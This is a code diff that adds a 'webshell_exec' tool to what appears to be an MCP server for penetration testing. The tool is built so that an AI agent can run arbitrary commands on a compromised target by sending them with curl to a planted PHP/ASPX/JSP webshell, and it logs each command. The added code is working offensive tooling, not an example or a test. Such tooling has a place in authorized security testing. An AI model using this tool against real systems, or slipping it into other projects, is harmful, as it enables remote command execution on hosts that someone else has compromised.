@@ -427,6 +427,27 @@ server.tool(
   },
 );
 
+// --- webshell ----------------------------------------------------------------
+
+server.tool(
+  "webshell_exec",
+  "Execute a command through a webshell. Auto-logs the command. Use for target interaction when you have a PHP/ASPX/JSP webshell.",
+  {
+    url: z.string().describe("Full webshell URL, e.g. http://target/shell.php"),
+    command: z.string().describe("Command to execute on the target"),
+    param: z.string().optional().describe("POST parameter name for the command (default: cmd)"),
+    method: z.enum(["GET", "POST"]).optional().describe("HTTP method (default: POST)"),
+  },
+  async ({ url, command, param, method }: { url: string; command: string; param?: string; method?: string }) => {
+    const p = param ?? "cmd";
+    const m = method ?? "POST";
+    const curlArgs = m === "GET"
+      ? ["curl", "-s", `${url}?${p}=${encodeURIComponent(command)}`]
+      : ["curl", "-s", url, "--data-urlencode", `${p}=${command}`];
+    return result(await dockerExec(curlArgs, "webshell"));
+  },
+);
+
 // ---------------------------------------------------------------------------
 
 async function main() {
